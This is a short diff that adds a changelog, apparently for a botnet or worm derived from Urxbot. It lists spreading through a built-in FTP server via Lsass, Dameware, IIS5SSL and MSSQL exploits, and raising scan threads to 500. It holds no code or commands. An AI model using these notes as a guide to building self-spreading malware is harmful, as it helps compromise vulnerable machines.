@@ -1,0 +1,10 @@
+:: 0x80 ::
+- FTPD coded added
+- Lsass Spreads via FTPD
+- Dameware Spreads via FTPD
+- IIS5SSL Spreads via FTPD
+- MSSQL Spreads via FTPD
+- Bot more stable than Urxbot
+- Max Scan thread are now 500
+- Change the FTPD port in configs.h instead or rndportnum
+
